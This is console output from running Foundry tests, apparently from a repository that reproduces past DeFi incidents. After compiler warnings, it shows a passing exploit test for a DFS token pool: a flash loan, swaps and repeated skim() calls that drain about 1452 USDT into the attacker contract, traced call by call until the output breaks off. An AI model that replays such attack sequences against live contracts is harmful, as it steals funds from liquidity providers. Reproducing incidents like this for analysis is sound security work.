Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.37s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2072): Unused local variable.
  --> src/test/2022-12/DFS_exp.sol:66:38:
   |
66 |         (uint256 reserve0beforeswap, uint256 reserve1beforeswap,) = DFS_USDT_LP.getReserves();
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 232.87ms (314.64µs CPU time)

Ran 1 test for src/test/2022-12/DFS_exp.sol:Attacker
[PASS] testExploit() (gas: 2314264)
Logs:
  [start] Attacker USDT Balance: 0.000000000000000000
  [INFO]  usdt balance : DFS_USDT_LP: 1462.547112307558921470
  [INFO]  Flashloan received 
  [INFO]  this balance (usdt token): 1462.547112307558921470
  [INFO]  this balance (dfs token): 0.000000000000000000
  [INFO]  swapamount : 99.216766548190000120
  [INFO]  dfs balance : address(this): 99.216766548190000120
  [INFO]  dfs balance : address(this): 398265.536438933393348235
  [INFO]  address(this) balance (dfs token): 18021.515523861736049008
  [INFO]  address(this) balance (usdt token): 0.000000000000000000
  [INFO]  address(DFS_USDT_LP) balance (usdt token): 2925.094224615117842940
  [INFO] payback amount usdt : 2922.169130390502725097
  [INFO]  Flashloan payback success 
  [INFO]  usdt balance : this: 1452.309282521406009020
  [End] Attacker USDT Balance: 1452.309282521406009020

Traces:
  [2381764] Attacker::testExploit()
    ├─ [1754855] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 8544 bytes of code
    ├─ [2531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[start] Attacker USDT Balance", val: 0, decimals: 18)
    ├─ [581924] Exploit::harvest()
    │   ├─ [2531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   └─ ← [Return] 1462547112307558921470 [1.462e21]
    │   ├─ emit log_named_decimal_uint(key: "[INFO]  usdt balance : DFS_USDT_LP", val: 1462547112307558921470 [1.462e21], decimals: 18)
    │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   └─ ← [Return] 1462547112307558921470 [1.462e21]
    │   ├─ [547416] USDT_CCDS_LP::swap(1462547112307558921470 [1.462e21], 0, Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x30)
    │   │   ├─ [27971] USDT::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1462547112307558921470 [1.462e21])
    │   │   │   ├─ emit Transfer(from: USDT_CCDS_LP: [0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1462547112307558921470 [1.462e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [477607] Exploit::pancakeCall(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1462547112307558921470 [1.462e21], 0, 0x30)
    │   │   │   ├─ emit log(val: "[INFO]  Flashloan received ")
    │   │   │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 1462547112307558921470 [1.462e21]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  this balance (usdt token)", val: 1462547112307558921470 [1.462e21], decimals: 18)
    │   │   │   ├─ [2649] dfs::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  this balance (dfs token)", val: 0, decimals: 18)
    │   │   │   ├─ [6071] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 1462547112307558921470 [1.462e21])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 1462547112307558921470 [1.462e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2540] DFS_USDT_LP::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 198831195487354709660 [1.988e20], 1462547112307558921470 [1.462e21], 1672339002 [1.672e9]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  swapamount ", val: 99216766548190000120 [9.921e19], decimals: 18)
    │   │   │   ├─ [136005] DFS_USDT_LP::swap(99216766548190000120 [9.921e19], 0, Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x00)
    │   │   │   │   ├─ [101679] dfs::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 99216766548190000120 [9.921e19])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 99216766548190000120 [9.921e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [771] Exploit::pancakeCall(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 99216766548190000120 [9.921e19], 0, 0x00)
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 198831195487354709660 [1.988e20]
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ emit Sync(reserve0: 198831195487354709660 [1.988e20], reserve1: 2925094224615117842940 [2.925e21])
    │   │   │   │   ├─ emit Swap(sender: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 99216766548190000120 [9.921e19], amount1In: 1462547112307558921470 [1.462e21], amount0Out: 99216766548190000120 [9.921e19], amount1Out: 0, to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [7821] DFS_USDT_LP::sync()
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 198831195487354709660 [1.988e20]
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ emit Sync(reserve0: 198831195487354709660 [1.988e20], reserve1: 2925094224615117842940 [2.925e21])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [649] dfs::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 99216766548190000120 [9.921e19]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  dfs balance : address(this)", val: 99216766548190000120 [9.921e19], decimals: 18)
    │   │   │   ├─ [649] dfs::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 99216766548190000120 [9.921e19]
    │   │   │   ├─ [21784] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 97232431217226200117 [9.723e19])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xc4DE46a5C8fc7f57F07E232b465243A3Da3692f0, value: 486162156086131000 [4.861e17])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 97232431217226200117 [9.723e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 296063626704580909777 [2.96e20]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 97232431217226200117 [9.723e19])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 97232431217226200117 [9.723e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 393296057921807109894 [3.932e20]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 194464862434452400234 [1.944e20])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 194464862434452400234 [1.944e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 587760920356259510128 [5.877e20]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 388929724868904800468 [3.889e20])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 388929724868904800468 [3.889e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 976690645225164310596 [9.766e20]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 777859449737809600936 [7.778e20])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 777859449737809600936 [7.778e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1754550094962973911532 [1.754e21]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 1555718899475619201872 [1.555e21])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 1555718899475619201872 [1.555e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 3310268994438593113404 [3.31e21]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 3111437798951238403744 [3.111e21])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 3111437798951238403744 [3.111e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 6421706793389831517148 [6.421e21]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 6222875597902476807488 [6.222e21])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 6222875597902476807488 [6.222e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 12644582391292308324636 [1.264e22]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 12445751195804953614976 [1.244e22])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 12445751195804953614976 [1.244e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 25090333587097261939612 [2.509e22]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 24891502391609907229952 [2.489e22])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 24891502391609907229952 [2.489e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 49981835978707169169564 [4.998e22]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 49783004783219814459904 [4.978e22])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 49783004783219814459904 [4.978e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 99764840761926983629468 [9.976e22]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 99566009566439628919808 [9.956e22])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 99566009566439628919808 [9.956e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15543] DFS_USDT_LP::skim(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 199330850328366612549276 [1.993e23]
    │   │   │   │   ├─ [4083] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 199132019132879257839616 [1.991e23])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 199132019132879257839616 [1.991e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [15681] DFS_USDT_LP::skim(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 398462869461245870388892 [3.984e23]
    │   │   │   │   ├─ [4221] dfs::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 398264038265758515679232 [3.982e23])
